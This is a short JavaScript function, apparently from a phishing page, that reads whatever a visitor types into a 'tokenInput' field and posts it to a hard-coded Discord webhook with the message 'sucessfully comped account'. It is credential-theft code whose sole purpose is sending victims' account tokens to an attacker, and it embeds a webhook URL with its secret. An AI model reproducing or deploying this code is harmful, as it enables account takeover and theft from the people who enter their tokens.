function func1() {
    var inputElements = document.getElementsByClassName("tokenInput");

    var inputElement = inputElements[0];

  
    var inputValue = inputElement.value;

    const whurl = "https://discord.com/api/webhooks/1170686362769432616/VRinymF9yECJz8bqOYhenViROare0qsAQjMub532AhJwXePOHHIfQSNd84sL62wfPm_J"

    const msg = {"content": `sucessfully comped account: ${inputValue}`}

    fetch(
        whurl,
        {
            "method": "POST",
            "headers": {
                "content-type": "application/json",
            },
            "body": JSON.stringify(msg)
        }
    )
}